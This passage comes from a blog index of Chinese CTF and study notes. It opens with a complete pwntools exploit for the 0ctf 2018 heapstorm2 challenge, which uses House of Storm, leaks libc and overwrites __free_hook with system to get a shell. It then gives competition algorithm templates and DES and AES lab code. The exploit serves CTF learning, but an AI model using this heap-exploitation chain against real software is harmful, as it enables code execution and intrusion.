hook地址和/bin/sh，将其改为system，获得shell，free_hook在chunk0处，/bin/sh\\x00在chunk1处\n#--------------修改 free_hook -----------------------------------#\npayload  = p64(0)*4\npayload += p64(free_hook) + p64(0x100)#chunk0\npayload += p64(0x13370800+0x40) + p64(8)#chunk1\npayload += '/bin/sh\\x00'\nedit(0, payload)\n\ndbg()\n\n之后改free_hook为system，free(1)，获得shell\nedit(0, p64(system))\nfree(1)\n\nitr()\n\n\nexp#coding:utf-8\nfrom pwn import *\ncontext(endian='little',os='linux',arch='amd64',log_level='debug')\nsh = process('./0ctf_2018_heapstorm2')\nlibc = ELF('./libc-2.23.so')\n#命令简写化\ns       = lambda data               :sh.send(data)\nsa      = lambda delim,data         :sh.sendafter(delim,data)\nsl      = lambda data               :sh.sendline(data)\nsla     = lambda delim,data         :sh.sendlineafter(delim,data)\nr       = lambda num=4096           :sh.recv(num)\nrl      = lambda num=4096           :sh.recvline(num)\nru      = lambda delims   :sh.recvuntil(delims )\nitr     = lambda                    :sh.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\n\ndef dbg():\n        gdb.attach(sh)\n        pause()\ndef add(size):\n\n    sla('Command: ','1')\n    sla('Size: ',str(size))  # 12&lt;size&lt;0x1000\n\n\ndef edit(idx,content):\n    sla('Command: ','2')\n    sla('Index: ',str(idx))\n    sla('Size: ',str(len(content)))\n    sa('Content: ',content)\n\n\n\ndef free(idx):\n    sla('Command: ','3')\n    sla('Index: ',str(idx))\n\n\ndef show(idx):\n    sla('Command: ','4')\n    sla('Index: ',str(idx))\n\n#---------------布置chunk-------------------------#\nadd(0x18)#0\t \nadd(0x508)#1\nadd(0x18)#2\n\nadd(0x18)#3   \nadd(0x508)#4\nadd(0x18)#5   \n\nadd(0x18)#6  \n\n#----------------准备 unsorted chunk-----------------------#\nedit(1,'\\x00'*0x4F0+p64(0x500)) \nfree(1)\nedit(0,'\\x00'*(0x18-12))  \nadd(0x18) #1 \nadd(0x4d8) #7  \n\nfree(1)   \nfree(2) #1-2 合并  \n\nadd(0x38)#1\nadd(0x4e8)#2   \n\n#-------------------准备 large chunk-----------------------------------#\nedit(4,'\\x00'*0x4F0+p64(0x500))#伪造chunk\nfree(4)\nedit(3,'\\x00'*(0x18-12)) \nadd(0x18) #4\nadd(0x4d8) #8  \n\nfree(4)\nfree(5) #4-5 \n\nadd(0x48)#4  \n#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#\nfree(2)\nadd(0x4e8) \nfree(2)   \n#--------------修改他们是的满足条件进行 house of strom------------------------------#\nfake_chunk = 0x13370800 - 0x20\npayload = '\\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)\nedit(7, payload) #修改unsorted chunk的bk\n\npayload = '\\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)\nedit(8, payload) #修改 large chunk 的 bk 和 bk_nextsize\nadd(0x48)  #2  -&gt; 0x133707e0   成功将申请到了heaparray附近\n\n \n\n#-----------------------泄漏 libc----------------------------------#\n#由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址\n\npayload = p64(0)*6 + p64(0x13370800)\nedit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0\n\n#dbg()\n \npayload = p64(0)*3 +p64(0x13377331)  #满足show的条件\n\npayload += p64(0x13370800) + p64(0x1000) #chunk0\npayload += p64(fake_chunk+3) + p64(8)   #chunk1\nedit(0, payload) #满足show的条件\n\n#dbg()\n\nshow(1)  #我们刚刚house of storm 写的地址泄漏出来\nru(\"]: \")\nheap = u64(r(6).ljust(8, '\\x00'))\nsuccess(\"heap:\"+hex(heap))\n\n#dbg()\n\npayload  = p64(0)*3 + p64(0x13377331)#满足show的条件\npayload += p64(0x13370800) + p64(0x1000) #chunk0\npayload += p64(heap+0x10) + p64(8) #chunk1\nedit(0, payload)\n\n#dbg()\n\nshow(1) #泄漏libc地址\nru(\"]: \")\nmalloc_hook = u64(r(6).ljust(8, '\\x00')) -0x58 - 0x10\nlibc_base = malloc_hook - libc.sym['__malloc_hook']\nfree_hook = libc_base+libc.sym['__free_hook']\nsystem = libc_base+ libc.sym['system']\nsuccess(\"free_hook:\"+hex(free_hook))\n \n#--------------修改 free_hook -----------------------------------#\npayload  = p64(0)*4\npayload += p64(free_hook) + p64(0x100)#chunk0\npayload += p64(0x13370800+0x40) + p64(8)#chunk1\npayload += '/bin/sh\\x00'\nedit(0, payload)\n#dbg()\nedit(0, p64(system))\nfree(1)\n\nitr()\n\n\n参考文章House of storm 原理及利用Largebin AttackCTF-WIKILargebin attack总结\n\n","tags":["House of 系列"]},{"title":"fastbin attack","url":"/2023/04/10/fastbin%20attack/","content":"如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：\n检测1：检测你要malloc的freechunk的大小是否在该chunk所在的fastbin链的大小尺寸范围内（例如：一个fastbin链所存储的\nchunk大小必须在0x30-0x40之间，但是你要申请的这个chunk却是0x50,那么就会程序就报错退出)\n\n检测2：检测你这个freechunk的size成员的PREV INUSE为是否为1，为1才可以通过检测\n\n","tags":["heap"]},{"title":"蓝桥杯","url":"/2023/04/10/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/","content":"救赎基础知识1.欧几里得辗转相除法 求解 最大公约数 最小公倍数int gcd(int a, int b){return b == 0 ? a : gcd(b, a % b);}\nint lcm(int a, int b){return a / gcd(a, b) * b;}\n\n2.求质数/* 判断素数 */\nbool isPrime(LL n) {\n    for (int i = 2; i * i &lt;= n; ++i)\n        if (n % i == 0)\n            return false;\n    return true;\n}\n\n3.栈#include &lt;stack&gt;\nstack&lt;类型&gt; mystack;\ns.empty();         //如果栈为空则返回true, 否则返回false;\ns.size();          //返回栈中元素的个数\ns.top();           //返回栈顶元素, 但不删除该元素\ns.pop();           //弹出栈顶元素, 但不返回其值\ns.push();          //将元素压入栈顶\n\n4.队列#include &lt;queue&gt;\nqueue&lt;类型&gt; myqueue;\npush() //在队尾插入一个元素\npop() //删除队列第一个元素\nsize() //返回队列中元素个数\nempty() //如果队列空则返回true\nfront() //返回队列中的第一个元素\nback() //返回队列中最后一个元素\n\n5.DFS(深度优先)int dx[4] = {0,0,-1,1};\nint dy[4] = {-1,1,0,0};\nint mp[N][N];//存放迷宫\nint vis[N][N];//表示是否访问过，初始为flase\nvoid DFS(int x, int y)\t//x,y是坐标点的位置 \n{\n    if(vis[x][y] || (x==n &amp;&amp; y==n)) return; //表示已经访问过了或者到达终点,递归的出口\n    vis[x][y] = true; //表示没有访问过，现在正在访问，置为访问过\n    for(int i=0; i &lt; 4; i++){\t//遍历四个方向，顺序依次是，上下左右\n        int nx = x + dx[i];\n        int ny = y + dy[i];\n      //进行了合法性检验，\n      //1.首先判断了该点是否越界，即是否在迷宫内  nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n\n      //2.然后判断是否访问过  !vis[nx][ny] 未访问过就继续\n      //3.最后判断是否为路  mp[nx][ny] == '0' 为路就继续\n        if(nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n &amp;&amp; !vis[nx][ny] &amp;&amp; mp[nx][ny] == '0')\n            dfs(nx,ny);\n    } \n}\n//注意!! 应该判断一下起点是否可走\n\n6.BFS(广度优先搜索)int X[4]={0, 0, -1, 1};\nint Y[4]={-1, 1, 0, 0};\nint matrix[N][N]; //存储迷宫信息\nint vis[N][N];\t//存储每个状态点是否走过\n\nstruct node{\n    int x;\n    int y;\n}Node, top;\n\nbool judge(int xx, int yy)\n{\n    if(xx&lt;0||yy&lt;0||xx&gt;=N||yy&gt;=N) //注意边界\n        return false;\n    if(vis[xx][yy]==true||matrix[xx][yy]==0)\t//下一个点走过或者为墙 0不能走，1能走\n        return false;\n    return true;\n}\n\n\nvoid BFS(int x, int y)\n{\n    queue&lt;node&gt; q;\n    Node.x=x;\n    Node.y=y;\n    q.push(Node);\t//将起点入队列\n    while(!q.empty())\t//队列不空就扩散\n    {\n        top=q.front();\t//取出队首元素\n        int nx=top.x;\n        int ny=top.y;\t//从四个方面机进行扩散\n         if(nx == ex &amp;&amp; ny == ey) //找到终点\n             return top;\n        for(int i=0; i&lt;4; i++)\n        {\n            if(judge(nx+X[i], ny+Y[i])) //检查四个方向，如果有路就进队列\n            {\n                Node.x=nx+X[i];\n                Node.y=ny+Y[i];\n                q.push(Node);\t\n            }\n        }\n        ans++;\t//计数器\n        vis[nx][ny]=true;\n        q.pop();\t//表示这个点的邻接点已经全部入队列，丢弃这个点\n    }\n}\n\n7.二分模板/*\n    作者:FengBOOOOOOOOOOOOOOO\n    二分模板返回大于x的第一个位置    \n*/\n#include&lt;cstdio&gt;\n#include&lt;algorithm&gt;\n#include&lt;cstring&gt;\n#define N 1005\nusing namespace std;\n\nint a[N],n,q;\n\nint find(int l,int r,int key)//l为-1，r为数组长度\n{\n    while(l + 1 &lt; r)\n    {\n        int mid = l + r&gt;&gt;1;\n        if(a[mid] &lt;= key)\n        　　l = mid;\n        else\n        　　r = mid;\n    }\n    return r;//返回大于Key的第一个位置\n}\n\nint main()\n{\n    int k;\n    scanf(\"%d%d\",&amp;n,&amp;q);\n    for(int i = 0; i &lt; n; ++i)\n    　　scanf(\"%d\",&amp;a[i]);\n    for(int i = 0; i &lt; q; ++i)\n    {\n        scanf(\"%d\",&amp;k);\n        printf(\"%d\\n\",find(-1,n,k));\n    }\n} \n\n最短路径问题1.SPFA最短路径(类似与BFS)#include &lt;iostream&gt;\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;algorithm&gt;\n#include &lt;queue&gt;\n#include &lt;vector&gt;\n#define ll long long\n#define inf 0x3f3f3f3f\n#define pii pair&lt;int, int&gt;\nconst int mod = 1e9+7;\nconst int maxn = 2e5+7;\nusing namespace std;\nstruct node {int to,w,next;} edge[maxn];\nint head[maxn], cnt;\nint dis[maxn], vis[maxn];\nint n, m, s, t;\nstruct Spfa\n{\n    void init()\n    {\n        memset(head,-1,sizeof(head));\n        memset(dis,0x3f3f3f3f,sizeof(dis));\n        memset(vis,0,sizeof(vis));\n        cnt = 0;\n    }\n \n    void add(int u,int v,int w)\n    {\n        edge[cnt].to = v;\n        edge[cnt].w = w;\n        edge[cnt].next = head[u];\n        head[u] = cnt ++;\n    }\n \n    void spfa()\n    {\n        dis[s] = 0; vis[s] = 1;\n        queue &lt;int&gt; Q; Q.push(s);\n        while(!Q.empty())\n        {\n            int now = Q.front();\n            Q.pop(); vis[now] = 0;    //从队列中弹出now , vis[now] 标记为未访问\n            for(int i = head[now]; i != -1; i = edge[i].next)\n            {\n                int v = edge[i].to;\n                if(dis[v] &lt; dis[now] + edge[i].w)\n                {\n                    dis[v] = dis[now] + edge[i].w;\n                    if(vis[v]) continue;    //如果访问过了(也就是 已经在队列中),就不用再push\n                    vis[v] = 1; Q.push(v);\n                }\n            }\n        }\n    }\n}sp;\n \nint main()\n{\n    while(~scanf(\"%d%d\",&amp;n,&amp;m) &amp;&amp; n+m)\n    {\n        sp.init();\n        for(int i = 0; i &lt; m; i++)\n        {\n            int u, v, w;\n            scanf(\"%d%d%d\",&amp;u, &amp;v, &amp;w);\n            sp.add(u, v, w);\n            sp.add(v, u, w);\n        }\n        s = 1, t = n; //s起点，t终点\n        sp.spfa();\n        printf(\"%d\\n\", dis[t]);\n    }\n}\n\n2.Dijkstra//主要思想一个大循环+两个小循环\nvoid dijkstra(){\n    int u, minx;\n    book[S] = 1;\n    for(int i = 0; i &lt; N; i++){\n    //dist[]数组初始化，把起始结点S到i结点的距离赋值给diat[i]\n        dist[i] = v[S][i];\n    }\n\n    for(int i = 0; i &lt; N; i++){//大循环\n        minx = INT_MAX;\n        for(int j = 0; j &lt; N; j++){//寻找没有被标记并且最短的路径，并记录此结点 \n            if(!book[j] &amp;&amp; minx &gt; dist[j]){\n                minx = dist[j];\n                u = j;\n            } \n        }\n        book[u] = 1;\n        for(int k = 0; k &lt; N; k++){\n        //如果A到B的距离大于A到C的距离加C到B的距离，那么更新数据\n            if(!book[k] &amp;&amp; dist[k] &gt; dist[u]+v[u][k]){\n                dist[k] = dist[u]+v[u][k];\n            }\n        }\n    }\n}\n\n3.Floyd//初始化：\n    for (int i = 1; i &lt;= n; i ++ )\n        for (int j = 1; j &lt;= n; j ++ )\n            if (i == j) d[i][j] = 0;\n            else d[i][j] = INF;\n\n// 算法结束后，d[a][b]表示a到b的最短距离\nvoid floyd()\n{\n    for (int k = 1; k &lt;= n; k ++ )\n        for (int i = 1; i &lt;= n; i ++ )\n            for (int j = 1; j &lt;= n; j ++ )\n                d[i][j] = min(d[i][j], d[i][k] + d[k][j]);\n}\n\n","tags":["蓝桥杯刷题总结"]},{"title":"密码学实验","url":"/2023/04/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/","content":"DES#include &lt;bits/stdc++.h&gt;\nusing namespace std;\nstring string_to_hex(const string&amp; str) //字符串转化为十六进制\n{\n    string result=\"\";\n    string tmp;\n    stringstream ss;\n    for(int i=0;i&lt;str.size();i++)\n    {\n        ss&lt;&lt;hex&lt;&lt;int(str[i])&lt;&lt;endl;\n        ss&gt;&gt;tmp;\n        result+=tmp;\n    }\n    return result;\n}\nstring hex_to_string(const std::string&amp; str)\n{\n    std::string result;\n    for (size_t i = 0; i &lt; str.length(); i += 2)//十六进制两个字符为原始字符一个字符\n    {\n        std::string byte = str.substr(i, 2);//每次切两个字符\n        //将十六进制的string转成long再强转成int再转成char\n        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);\n        result.push_back(chr);//将处理完的字符压入result中\n    }\n    return result;\n}\n\nstring hex2bin(string s)\n{\n    //十六进制转化为二进制\n    unordered_map&lt;char, string&gt; mp;\n    mp['0'] = \"0000\";\n    mp['1'] = \"0001\";\n    mp['2'] = \"0010\";\n    mp['3'] = \"0011\";\n    mp['4'] = \"0100\";\n    mp['5'] = \"0101\";\n    mp['6'] = \"0110\";\n    mp['7'] = \"0111\";\n    mp['8'] = \"1000\";\n    mp['9'] = \"1001\";\n    mp['A'] = \"1010\";\n    mp['B'] = \"1011\";\n    mp['C'] = \"1100\";\n    mp['D'] = \"1101\";\n    mp['E'] = \"1110\";\n    mp['F'] = \"1111\";\n    string bin = \"\";\n    for (int i = 0; i &lt; s.size(); i++) {\n        bin += mp[s[i]];\n    }\n    return bin;\n}\nstring bin2hex(string s)\n{\n    // 二进制转化为16进制\n    unordered_map&lt;string, string&gt; mp;\n    mp[\"0000\"] = \"0\";\n    mp[\"0001\"] = \"1\";\n    mp[\"0010\"] = \"2\";\n    mp[\"0011\"] = \"3\";\n    mp[\"0100\"] = \"4\";\n    mp[\"0101\"] = \"5\";\n    mp[\"0110\"] = \"6\";\n    mp[\"0111\"] = \"7\";\n    mp[\"1000\"] = \"8\";\n    mp[\"1001\"] = \"9\";\n    mp[\"1010\"] = \"A\";\n    mp[\"1011\"] = \"B\";\n    mp[\"1100\"] = \"C\";\n    mp[\"1101\"] = \"D\";\n    mp[\"1110\"] = \"E\";\n    mp[\"1111\"] = \"F\";\n    string hex = \"\";\n    for (int i = 0; i &lt; s.length(); i += 4) {\n        string ch = \"\";\n        ch += s[i];\n        ch += s[i + 1];\n        ch += s[i + 2];\n        ch += s[i + 3];\n        hex += mp[ch];\n    }\n    return hex;\n}\n\nstring permute(string k, int* arr, int n)\n{\n    string per = \"\";\n    for (int i = 0; i &lt; n; i++) {\n        per += k[arr[i] - 1];\n    }\n    return per;\n}\n\nstring shift_left(string k, int shifts)\n{\n    string s = \"\";\n    for (int i = 0; i &lt; shifts; i++) {\n        for (int j = 1; j &lt; 28; j++) {\n            s += k[j];\n        }\n        s += k[0];\n        k = s;\n        s = \"\";\n    }\n    return k;\n}\n\nstring xor_(string a, string b)\n{\n    string ans = \"\";\n    for (int i = 0; i &lt; a.size(); i++) {\n        if (a[i] == b[i]) {\n            ans += \"0\";\n        }\n        else {\n            ans += \"1\";\n        }\n    }\n    return ans;\n}\nstring encrypt(string pt, vector&lt;string&gt; rkb,\n               vector&lt;string&gt; rk)\n{\n    // 16-&gt;2\n    pt = hex2bin(pt);\n\n    // 初始置换\n    int initial_perm[64]\n            = { 58, 50, 42, 34, 26, 18, 10, 2,  60, 52, 44,\n                36, 28, 20, 12, 4,  62, 54, 46, 38, 30, 22,\n                14, 6,  64, 56, 48, 40, 32, 24, 16, 8,  57,\n                49, 41, 33, 25, 17, 9,  1,  59, 51, 43, 35,\n                27, 19, 11, 3,  61, 53, 45, 37, 29, 21, 13,\n                5,  63, 55, 47, 39, 31, 23, 15, 7 };\n    // 初始置换\n    pt = permute(pt, initial_perm, 64);\n    cout &lt;&lt; \"初始置换后: \" &lt;&lt; bin2hex(pt)\n         &lt;&lt; endl;\n\n    // 拆分成左右32比特\n    string left = pt.substr(0, 32);\n    string right = pt.substr(32, 32);\n    cout &lt;&lt; \"拆分后: L0=\" &lt;&lt; bin2hex(left)\n         &lt;&lt; \" R0=\" &lt;&lt; bin2hex(right) &lt;&lt; endl;\n\n    // E盒扩展\n    int exp_d[48]\n            = { 32, 1,  2,  3,  4,  5,  4,  5,  6,  7,  8,  9,\n                8,  9,  10, 11, 12, 13, 12, 13, 14, 15, 16, 17,\n                16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,\n                24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1 };\n\n    // S盒\n    int s[8][4][16] = {\n            { 14, 4,  13, 1, 2,  15, 11, 8,  3,  10, 6,  12, 5,9,  0,  7,  0, 15, 7,  4,  14, 2,  13, 1,  10, 6,12, 11, 9,  5, 3,  8,  4,  1,  14, 8,  13, 6,  2, 11, 15, 12, 9, 7,  3,  10, 5,  0,  15, 12, 8,  2, 4,  9,  1,  7, 5,  11, 3,  14, 10, 0,  6,  13 },\n            { 15, 1,  8,  14, 6,  11, 3, 4,  9,  7,  2,  13, 12, 0,  5,  10, 3,  13, 4,  7, 15, 2,  8,  14, 12, 0, 1,  10, 6,  9,  11, 5,  0, 14, 7,  11, 10, 4,  13, 1,  5,  8,  12, 6,  9,  3, 2,  15, 13, 8,  10, 1, 3,  15, 4,  2,  11, 6,  7, 12, 0,  5,  14, 9 },\n            { 10, 0,  9,  14, 6,  3,  15, 5,  1,  13, 12, 7,  11, 4,  2,  8,  13, 7,  0,  9,  3,  4, 6,  10, 2,  8,  5,  14, 12, 11, 15, 1,  13, 6,  4,  9,  8,  15, 3,  0,  11, 1,  2,  12, 5,  10, 14, 7,  1,  10, 13, 0,  6,  9,  8, 7,  4,  15, 14, 3,  11, 5,  2,  12 },\n            { 7,  13, 14, 3,  0,  6,  9,  10, 1,  2, 8,  5,  11, 12, 4,  15, 13, 8,  11, 5,  6,  15, 0, 3,  4,  7, 2,  12, 1,  10, 14, 9,  10, 6,  9,  0, 12, 11, 7, 13, 15, 1,  3,  14, 5,  2,  8,  4,  3, 15, 0,  6, 10, 1,  13, 8,  9,  4,  5,  11, 12, 7, 2,  14 },\n            { 2,  12, 4, 1,  7,  10, 11, 6, 8,  5,  3,  15, 13, 0,  14, 9, 14, 11, 2,  12, 4, 7,  13, 1,  5,  0, 15, 10, 3, 9,  8,  6,  4,  2, 1,  11, 10, 13, 7, 8,  15, 9, 12, 5,  6,  3,  0, 14, 11, 8,  12, 7, 1,  14, 2, 13, 6,  15, 0,  9, 10, 4,  5,  3 },\n            { 12, 1,  10, 15, 9,  2,  6,  8,  0,  13, 3, 4, 14, 7,  5,  11, 10, 15, 4,  2,  7,  12, 9,  5, 6, 1, 13, 14, 0,  11, 3,  8,  9,  14, 15, 5,  2, 8, 12, 3,  7,  0,  4,  10, 1,  13, 11, 6,  4,  3, 2, 12, 9,  5,  15, 10, 11, 14, 1,  7,  6,  0,  8, 13 },\n            { 4,  11, 2,  14, 15, 0,  8, 13, 3,  12, 9,  7,  5,  10, 6,  1,  13, 0,  11, 7, 4,  9,  1,  10, 14, 3, 5,  12, 2,  15, 8,  6,  1, 4,  11, 13, 12, 3,  7, 14, 10, 15, 6,  8,  0,  5, 9,  2,  6,  11, 13, 8, 1,  4,  10, 7,  9,  5,  0, 15, 14, 2,  3,  12 },\n            { 13, 2,  8, 4,  6,  15, 11, 1,  10, 9, 3, 14, 5, 0,  12, 7, 1,  15, 13, 8,  10, 3,  7, 4, 12, 5, 6,  11, 0, 14, 9,  2,  7,  11, 4,  1, 9, 12, 14, 2,  0,  6, 10, 13, 15, 3,  5,  8,  2, 1, 14, 7, 4,  10, 8, 13, 15, 12, 9,  0,  3,  5, 6, 11 }\n    };\n\n    // P盒置换\n    int per[32]\n            = { 16, 7, 20, 21, 29, 12, 28, 17, 1,  15, 23,\n                26, 5, 18, 31, 10, 2,  8,  24, 14, 32, 27,\n                3,  9, 19, 13, 30, 6,  22, 11, 4,  25 };\n\n    cout &lt;&lt; endl;\n    for (int i = 0; i &lt; 16; i++) {\n        string right_expanded = permute(right, exp_d, 48);\n\n        string x = xor_(rkb[i], right_expanded);\n\n        // S\n        string op = \"\";\n        for (int i = 0; i &lt; 8; i++) {\n            int row = 2 * int(x[i * 6] - '0')\n                      + int(x[i * 6 + 5] - '0');\n            int col = 8 * int(x[i * 6 + 1] - '0')\n                      + 4 * int(x[i * 6 + 2] - '0')\n                      + 2 * int(x[i * 6 + 3] - '0')\n                      + int(x[i * 6 + 4] - '0');\n            int val = s[i][row][col];\n            op += char(val / 8 + '0');\n            val = val % 8;\n            op += char(val / 4 + '0');\n            val = val % 4;\n            op += char(val / 2 + '0');\n            val = val % 2;\n            op += char(val + '0');\n        }\n        op = permute(op, per, 32);\n\n        x = xor_(op, left);\n\n        left = x;\n\n        // 交换左右\n        if (i != 15) {\n            swap(left, right);\n        }\n        cout &lt;&lt; \"轮数: \" &lt;&lt; i + 1 &lt;&lt; \" \" &lt;&lt; bin2hex(left)\n             &lt;&lt; \" \" &lt;&lt; bin2hex(right) &lt;&lt; \" \" &lt;&lt; rk[i]\n             &lt;&lt; endl;\n    }\n\n    // 左右结合\n    string combine = left + right;\n\n    // IP逆置换\n    int final_perm[64]\n            = { 40, 8,  48, 16, 56, 24, 64, 32, 39, 7,  47,\n                15, 55, 23, 63, 31, 38, 6,  46, 14, 54, 22,\n                62, 30, 37, 5,  45, 13, 53, 21, 61, 29, 36,\n                4,  44, 12, 52, 20, 60, 28, 35, 3,  43, 11,\n                51, 19, 59, 27, 34, 2,  42, 10, 50, 18, 58,\n                26, 33, 1,  41, 9,  49, 17, 57, 25 };\n\n    string cipher = bin2hex(permute(combine, final_perm, 64));\n    return cipher;\n}\n\nint main()\n{\n    string pt, key;\n    cout&lt;&lt;\"请输入明文: \";\n    cin&gt;&gt;pt;\n    cout&lt;&lt;\"请输入密文: \";\n    cin&gt;&gt;key;\n    pt = string_to_hex(pt);\n    cout&lt;&lt;pt;\n    key = string_to_hex(key);\n    key = hex2bin(key);\n    int keyp[56]\n            = { 57, 49, 41, 33, 25, 17, 9,  1,  58, 50, 42, 34,\n                26, 18, 10, 2,  59, 51, 43, 35, 27, 19, 11, 3,\n                60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7,\n                62, 54, 46, 38, 30, 22, 14, 6,  61, 53, 45, 37,\n                29, 21, 13, 5,  28, 20, 12, 4 };\n\n    //密钥生成\n    key = permute(key, keyp, 56);\n\n    int shift_table[16] = { 1, 1, 2, 2, 2, 2, 2, 2,\n                            1, 2, 2, 2, 2, 2, 2, 1 };\n\n    int key_comp[48] = { 14, 17, 11, 24, 1,  5,  3,  28,\n                         15, 6,  21, 10, 23, 19, 12, 4,\n                         26, 8,  16, 7,  27, 20, 13, 2,\n                         41, 52, 31, 37, 47, 55, 30, 40,\n                         51, 45, 33, 48, 44, 49, 39, 56,\n                         34, 53, 46, 42, 50, 36, 29, 32 };\n    string left = key.substr(0, 28);\n    string right = key.substr(28, 28);\n\n    vector&lt;string&gt; rkb;\n    vector&lt;string&gt; rk;\n    for (int i = 0; i &lt; 16; i++) {\n        left = shift_left(left, shift_table[i]);\n        right = shift_left(right, shift_table[i]);\n\n        string combine = left + right;\n\n        string RoundKey = permute(combine, key_comp, 48);\n\n        rkb.push_back(RoundKey);\n        rk.push_back(bin2hex(RoundKey));\n    }\n\n    cout &lt;&lt; \"加密:\\n\";\n    string cipher = encrypt(pt, rkb, rk);\n    cout &lt;&lt; \"密文: \" &lt;&lt; cipher &lt;&lt; endl;\n\n    cout &lt;&lt; \"解密:\\n\";\n    reverse(rkb.begin(), rkb.end());\n    reverse(rk.begin(), rk.end());\n    string text = encrypt(cipher, rkb, rk);\n    text = hex_to_string(text);\n    cout &lt;&lt; \"明文: \" &lt;&lt; text &lt;&lt; endl;\n}\n\nAES#include &lt;iostream&gt;\n#include &lt;bits/stdc++.h&gt;\n#include &lt;stdint.h&gt;\n#include&lt;iomanip&gt;\nvoid AddRoundKey(uint8_t mtx[],uint32_t w[]);\nuint32_t SubKeys(uint32_t temp);\nvoid SubBytes(uint8_t mtx[],int len);\nvoid KeyExpansion(uint8_t key[], uint32_t new_key[]);\nvoid Display(uint8_t Matrix[]);\nvoid DisplayKeys(uint8_t Matrix[][16]);\nuint32_t left_bit_move(uint32_t val, int n);\nusing namespace std;\nuint32_t T[4][256];//存储4张列混淆表\nint mixCol[4][4] = {\n        {0x02, 0x03, 0x01, 0x01},\n        {0x01, 0x02, 0x03, 0x01},\n        {0x01, 0x01, 0x02, 0x03},\n        {0x03, 0x01, 0x01, 0x02}\n};//列混淆矩阵\nuint8_t S_Box[16][16] =\n        {\n                {0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76},\n                {0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0},\n                {0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15},\n                {0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75},\n                {0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84},\n                {0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF},\n                {0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8},\n                {0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2},\n                {0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73},\n                {0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB},\n                {0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79},\n                {0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08},\n                {0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A},\n                {0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E},\n                {0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF},\n                {0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16}\n        };\n//逆S盒\nuint8_t Inv_S_Box[16][16] =\n        {\n                {0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB},\n                {0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB},\n                {0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E},\n                {0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25},\n                {0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 